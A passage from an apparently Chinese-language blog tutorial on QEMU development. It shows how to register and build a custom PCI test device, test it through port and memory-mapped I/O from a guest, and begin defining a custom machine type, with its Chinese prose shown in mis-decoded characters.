&amp;ds-&gt;pmio);<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åæ˜¯ Class ä¸ Objectï¼ˆä¹Ÿå°±æ˜¯ instanceï¼‰çš„åˆå§‹åŒ–å‡½æ•°ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨ Class çš„åˆå§‹åŒ–å‡½æ•°ä¸­æˆ‘ä»¬åº”å½“è®¾ç½®çˆ¶ç±» <code>PCIDeviceClass</code> çš„ä¸€ç³»åˆ—åŸºæœ¬å±æ€§ï¼ˆä¹Ÿå°±æ˜¯ PCI è®¾å¤‡çš„åŸºæœ¬å±æ€§ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_instance_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    DeviceClass *dc = DEVICE_CLASS(oc);<br>    PCIDeviceClass *pci = PCI_DEVICE_CLASS(oc);<br><br>    pci-&gt;realize = a3dev_realize;<br>    pci-&gt;vendor_id = PCI_VENDOR_ID_QEMU;<br>    pci-&gt;device_id = <span class="hljs-number">0x1919</span>;<br>    pci-&gt;revision = <span class="hljs-number">0x81</span>;<br>    pci-&gt;class_id = PCI_CLASS_OTHERS;<br><br>    dc-&gt;desc = <span class="hljs-string">&quot;arttnba3 test PCI device&quot;</span>;<br>    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯ä¸ºæˆ‘ä»¬çš„ PCI è®¾å¤‡ç±»å‹æ³¨å†Œ TypeInfo äº†ï¼Œè¿™é‡Œåˆ«å¿˜äº†<strong>æˆ‘ä»¬çš„æ¥å£ä¸­åº”å½“å¢åŠ ä¸Š PCI çš„æ¥å£</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3dev_type_info = &#123;<br>    .name = TYPE_A3DEV_PCI,<br>    .parent = TYPE_PCI_DEVICE,<br>    .instance_init = a3dev_instance_init,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevState),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevClass),<br>    .class_init = a3dev_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,<br>        &#123; &#125;,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_register_types</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    type_register_static(&amp;a3dev_type_info);<br>&#125;<br><br>type_init(a3dev_register_types);<br></code></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬åœ¨ meson æ„å»ºç³»ç»Ÿä¸­åŠ å…¥æˆ‘ä»¬æ–°å¢çš„è¿™ä¸ªè®¾å¤‡ï¼Œåœ¨ <code>hw/misc/meson.build</code> ä¸­åŠ å…¥å¦‚ä¸‹è¯­å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs meson">softmmu_ss.add(when: &#x27;CONFIG_PCI_A3DEV&#x27;, if_true: files(&#x27;a3dev.c&#x27;))<br></code></pre></td></tr></table></figure><p>å¹¶åœ¨ <code>hw/misc/Kconfig</code> ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼Œè¿™è¡¨ç¤ºæˆ‘ä»¬çš„è®¾å¤‡ä¼šåœ¨ <code>CONFIG_PCI_DEVICES=y</code> æ—¶ç¼–è¯‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config PCI_A3DEV<br>    bool<br>    default y if PCI_DEVICES<br>    depends on PCI<br></code></pre></td></tr></table></figure><p>ä¹‹åç¼–è¯‘ Qemu å¹¶é™„åŠ ä¸Š <code>-device a3dev-pci</code> ï¼Œä¹‹åéšä¾¿èµ·ä¸€ä¸ª Linux ç³»ç»Ÿï¼Œæ­¤æ—¶ä½¿ç”¨ <code>lspci</code> æŒ‡ä»¤æˆ‘ä»¬ä¾¿èƒ½çœ‹åˆ°æˆ‘ä»¬æ–°æ·»åŠ çš„ pci è®¾å¤‡ï¼š</p><p><img src="https://s2.loli.net/2022/07/28/Eu82rKgSlJBtbic.png" alt="image.png"></p><p>æˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹ç¨‹åºæ¥æµ‹è¯•æˆ‘ä»¬çš„è®¾å¤‡çš„è¾“å…¥è¾“å‡ºï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™éœ€è¦ root æƒé™ï¼š</p><blockquote><p>PMIOï¼Œä½¿ç”¨ iopl æ›´æ”¹ç«¯å£æƒé™åä¾¿èƒ½é€šè¿‡ in/out ç±»æŒ‡ä»¤è¯»å†™ç«¯å£</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> port_addr;<br><br>        <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] no port provided!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (iopl(<span class="hljs-number">3</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] no privilege!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        port_addr = atoi(argv[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] a3dev port addr start at: %d\n&quot;</span>, port_addr);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] now writing into a3dev-pci...&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                outl(i, port_addr + i * <span class="hljs-number">4</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] writing done!&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] now reading from a3dev-pci...&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[--%d--]&quot;</span>, port_addr + i * <span class="hljs-number">4</span>);<br>                &#125;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %d &quot;</span>, inl(port_addr + i * <span class="hljs-number">4</span>));<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[+] reading done!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>PMIO æµ‹è¯•æˆåŠŸï¼Œè®¾å¤‡è¯»å†™åŠŸèƒ½æ­£å¸¸ï¼š</p><p><img src="https://s2.loli.net/2022/07/28/k4G1cOvNHwUtsjQ.png" alt="image.png"></p><blockquote><p>MMIOï¼Œä½¿ç”¨ mmap æ˜ å°„ <code>sys</code> ç›®å½•ä¸‹è®¾å¤‡çš„ <code>resource0</code> æ–‡ä»¶å³å¯ç›´æ¥è¯»å†™</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *addr, <span class="hljs-type">uint32_t</span> val)</span><br>&#123;<br>        *addr = val;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *addr)</span><br>&#123;<br>        <span class="hljs-keyword">return</span> *addr;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>        <span class="hljs-type">uint32_t</span> *mmio_addr;<br>        <span class="hljs-type">int</span> dev_fd;<br><br>        dev_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,<br>                        O_RDWR | O_SYNC);<br>        <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] failed to open mmio file! wrong path or no root!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        mmio_addr = (<span class="hljs-type">uint32_t</span>*)<br>                mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, dev_fd, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (mmio_addr == MAP_FAILED) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;failed to mmap!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] start writing to a3dev-pci...&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                mmio_write(mmio_addr + i, i);<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] write done!&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] start reading from a3dev-pci...&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[--%p--]&quot;</span>, mmio_addr);<br>                &#125;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %u &quot;</span>, mmio_read(mmio_addr + i));<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[+] read done!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>MMIO æµ‹è¯•æˆåŠŸï¼Œè®¾å¤‡è¯»å†™åŠŸèƒ½æ­£å¸¸ï¼š</p><p><img src="https://s2.loli.net/2022/07/28/RCoHF7SWPIyD54j.png" alt="image.png"></p><h1>0x05.è‡ªå®šä¹‰ QEMU æœºå™¨ç±»å‹ï¼ˆğŸ•Šï¼‰</h1><p>ä¼—æ‰€å‘¨çŸ¥åœ¨ Qemu å½“ä¸­æœ‰å¾ˆå¤šç§ä¸åŒçš„æœºå™¨ç±»å‹ï¼Œå…¶è¡¨ç¤ºç€åŒ…å«ä¸€äº›é»˜è®¤è®¾å¤‡ï¼ˆåŒ…å«PCIeæ˜¾å¡ã€ä»¥å¤ªç½‘æ§åˆ¶å™¨ã€SATAæ§åˆ¶å™¨ç­‰ï¼‰çš„è™šæ‹ŸèŠ¯ç‰‡ç»„ï¼Œä¾‹å¦‚ <code>pc</code> å¯¹åº”äº Intel çš„ <code>440FX</code> èŠ¯ç‰‡ç»„ï¼ˆè¿™ä¹Ÿæ˜¯ Qemu é»˜è®¤é€‰æ‹©çš„æœºå™¨ç±»å‹ï¼‰</p><p><img src="https://s2.loli.net/2022/07/14/d1uhrIAYl682WSj.png" alt="image.png"></p><p>Qemu ä¸»è¦æ”¯æŒä¸¤ç§å¤§çš„ x86 èŠ¯ç‰‡ç»„ï¼ši440FX å’Œ Q35ï¼Œåè€…ç›¸æ¯”å‰è€…è€Œè¨€çš„ä¸€ä¸ªå¤§çš„äº®ç‚¹ä¾¿æ˜¯å¢åŠ äº†å¯¹ PCIe çš„æ”¯æŒï¼š</p><p><img src="https://s2.loli.net/2022/07/14/2xgwV7GeSskzWc4.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>-machine</code> é€‰é¡¹æ¥æŒ‡å®šæˆ‘ä»¬è¦åˆ›å»ºçš„è™šæ‹Ÿæœºçš„æœºå™¨ç±»å‹ï¼Œé€šè¿‡ <code>-machine ?</code> é€‰é¡¹å¯ä»¥æŸ¥çœ‹å½“å‰æ”¯æŒçš„æœºå™¨ç±»å‹ï¼š</p><p><img src="https://s2.loli.net/2022/07/14/v6G5DV4SK7hCbRZ.png" alt="image.png"></p><p>ä½†è‡ªå¸¦çš„æœºå™¨ç±»å‹é€šå¸¸å¾€å¾€æ— æ³•æ»¡è¶³æˆ‘ä»¬å¤šæ ·åŒ–çš„è¦æ±‚ï¼Œå› æ­¤æœ‰çš„æ—¶å€™æˆ‘ä»¬éœ€è¦è‡ªè¡Œç¼–å†™ä¸€ç§æœºå™¨ç±»å‹æ¥æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚</p><h2 id="ä¸€ã€æ·»åŠ æºç æ–‡ä»¶ä¸ç¼–è¯‘é€‰é¡¹">ä¸€ã€æ·»åŠ æºç æ–‡ä»¶ä¸ç¼–è¯‘é€‰é¡¹</h2><p>åœ¨ Qemu æºç ç›®å½•ä¸­ï¼Œä¸å…·ä½“æ”¯æŒçš„ç¡¬ä»¶ç›¸å…³çš„ä»£ç éƒ½æ”¾åœ¨ <code>hw/</code> ç›®å½•ä¸‹ï¼Œä¾‹å¦‚é»˜è®¤çš„ <code>PC</code> æ¶æ„ä¾¿å®šä¹‰äº <code>hw/i386/pc.c</code>ï¼Œå› æ­¤è‹¥æ˜¯æˆ‘ä»¬æƒ³è¦å®šä¹‰ä¸€ç§æ–°çš„æœºå™¨ç±»å‹åˆ™åœ¨è¯¥ç›®å½•ä¸‹è¿›è¡Œå®šä¹‰æ˜¯æœ€å¥½çš„</p><p>è€ç‰ˆæœ¬çš„ Qemu æ˜¯çº¯ç²¹åŸºäº Makefile è¿›è¡Œæ„å»ºçš„ï¼Œè€Œç°åœ¨çš„æ–°ç‰ˆæœ¬ Qemu ä¸­åˆ™æ˜¯ä½¿ç”¨ meson è¿›è¡Œé¡¹ç›®æ„å»ºï¼Œå› æ­¤ç¬”è€…æ¥ä¸‹æ¥å°†ä¼šåŒæ—¶ä»‹ç»ä¸¤ç§é…ç½®æ–¹æ³•</p><h3 id="Iã€æ–°ç‰ˆæœ¬-Qemu-é…ç½®æ–¹å¼ï¼ˆmesonï¼‰">Iã€æ–°ç‰ˆæœ¬ Qemu é…ç½®æ–¹å¼ï¼ˆmesonï¼‰</h3><p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©å®šä¹‰ä¸€ç§æ–°çš„æœºå™¨ç±»å‹åä¸º <code>a3-pc</code>ï¼Œå¹¶åœ¨ <code>hw/i386/a3-pc</code> ä¸‹åˆ›å»ºå¦‚ä¸‹ç›®å½•ç»“æ„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree hw/i386/a3-pc/</span><br>hw/i386/a3-pc/<br>â”œâ”€â”€ accel.c<br>â”œâ”€â”€ machine.c<br>â””â”€â”€ meson.build<br><br>0 directories, 3 files<br></code></pre></td></tr></table></figure><p>ä¸‰ä¸ªæ–‡ä»¶è¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><code>meson.build</code>ï¼šmeson é¡¹ç›®æ„å»ºæ–‡ä»¶</li><li><code>machine.c</code>ï¼šæœºå™¨çš„ä¸»ä½“ä»£ç </li><li><code>accel.c</code>ï¼šè‡ªå®šä¹‰çš„ accelerator ä»£ç </li></ul><p>åœ¨ <code>meson.build</code> ä¸­å†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs meson">a3pc_ss = ss.source_set()<br>a3pc_ss.add(files(&#x27;accel.c&#x27;))<br>a3pc_ss.add(files(&#x27;machine.c&#x27;))<br><br>i386_ss.add_all(when: &#x27;CONFIG_A3_PC&#x27;, if_true: a3pc_ss)<br></code></pre></td></tr></table></figure><p>ä¹‹ååœ¨ <code>hw/i386/meson.build</code> ä¸­æ·»åŠ è¯¥è¯­å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs meson">subdir(&#x27;a3-pc&#x27;)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç¬”è€…é€‰æ‹©åˆ›å»ºä¸€ä¸ª i386 ç±»å‹çš„æœºå™¨ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦ä¿®æ”¹ <code>hw/i386/Kconfig</code>ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config A3_PC<br>    bool<br></code></pre></td></tr></table></figure><p>åœ¨ <code>configs/devices/i386-softmmu/default.mak</code> æœ«å°¾æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼Œä½¿å¾—æˆ‘ä»¬çš„æ–°çš„æœºå™¨ç±»å‹ä¼šè¢«é»˜è®¤ç¼–è¯‘è¿›å»ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CONFIG_A3_PC=y<br></code></pre></td></tr></table></figure><h3 id="IIã€è€ç‰ˆæœ¬-Qemu-é…ç½®æ–¹å¼ï¼ˆmakefileï¼‰">IIã€è€ç‰ˆæœ¬ Qemu é…ç½®æ–¹å¼ï¼ˆmakefileï¼‰</h3><p>å¦‚æœæ˜¯ç‰ˆæœ¬ç¨å¾®è€ä¸€ç‚¹çš„ Qemu åˆ™åº”å½“åœ¨ <code>hw/a3-pc</code> ä¸‹åˆ›å»ºå¦‚ä¸‹ç›®å½•ç»“æ„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree ./hw/a3-pc/</span><br>./hw/a3-pc/<br>â”œâ”€â”€ accel.c<br>â”œâ”€â”€ machine.c<br>â””â”€â”€ Makefile.objs<br><br>0 directories, 3 files<br></code></pre></td></tr></table></figure><p>ä¸‰ä¸ªæ–‡ä»¶è¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><code>Makefile.objs</code>ï¼šæœºå™¨çš„ Makefile æ–‡ä»¶</li><li><code>machine.c</code>ï¼šæœºå™¨çš„ä¸»ä½“ä»£ç </li><li><code>accel.c</code>ï¼šè‡ªå®šä¹‰çš„ accelerator ä»£ç ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨é»˜è®¤çš„ TCG accelerator</li></ul><p>å¹¶åœ¨ <code>Makefile.objs</code> ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">obj-<span class="hljs-variable">$(CONFIG_A3_PC)</span> += accel.o<br>obj-<span class="hljs-variable">$(CONFIG_A3_PC)</span> += machine.o<br></code></pre></td></tr></table></figure><p>ä¹‹ååœ¨ <code>hw/Makefile.objs</code> ä¸­æ·»åŠ ä¸Šè¯¥é…ç½®ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile">devices-dirs-y = core/<br><span class="hljs-keyword">ifeq</span> (<span class="hljs-variable">$(CONFIG_SOFTMMU)</span>, y)<br><span class="hljs-comment"># ...</span><br>devices-dirs-<span class="hljs-variable">$(CONFIG_A3_PC)</span> += a3-pc/<br><span class="hljs-keyword">endif</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬é€šè¿‡æ·»åŠ ä¸€ä¸ªæ–°çš„é€‰é¡¹ <code>CONFIG_A3_PC</code> æ¥æ§åˆ¶æ˜¯å¦è¦è¿›è¡Œè¯¥ç±»å‹æœºå™¨çš„ç¼–è¯‘</p><p>ç¬”è€…é€‰æ‹©åˆ›å»ºä¸€ä¸ª i386 ç±»å‹çš„æœºå™¨ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦ä¿®æ”¹ <code>hw/i386/Kconfig</code>ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼Œè¡¨ç¤ºä¸€ä¸ªç©ºç™½çš„æœºå™¨ï¼Œåé¢æˆ‘ä»¬è‹¥æ˜¯éœ€è¦æ·»åŠ ç¡¬ä»¶åˆ™è¿˜éœ€è¦åœ¨è¿™éƒ¨åˆ†è¿›è¡Œæ”¹åŠ¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config A3_PC<br>    bool<br></code></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬åœ¨æºç æ ¹ç›®å½•çš„ <code>configure</code> æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹å³å¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-function"><span class="hljs-title">supported_a3_pc_target</span></span>() &#123;<br>    <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a3_pc</span>&quot;</span> = <span class="hljs-string">&quot;yes&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    glob <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-string">&quot;*-softmmu&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;1%-softmmu&#125;</span>&quot;</span> <span class="hljs-keyword">in</span><br>x86_64)<br>    <span class="hljs-built_in">return</span> 0<br>    ;;<br>    <span class="hljs-keyword">esac</span><br>    <span class="hljs-built_in">return</span> 1<br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">supported_target</span></span>() &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-keyword">in</span><br><span class="hljs-comment"># ...</span><br>    supported_a3_pc_target <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 0<br>    print_error <span class="hljs-string">&quot;TCG disabled, but hardware accelerator not available for &#x27;<span class="hljs-variable">$target</span>&#x27;&quot;</span><br>    <span class="hljs-built_in">return</span> 1<br>&#125;<br><span class="hljs-comment"># ...</span><br><span class="hljs-keyword">for</span> opt <span class="hljs-keyword">do</span><br>  optarg=$(<span class="hljs-built_in">expr</span> <span 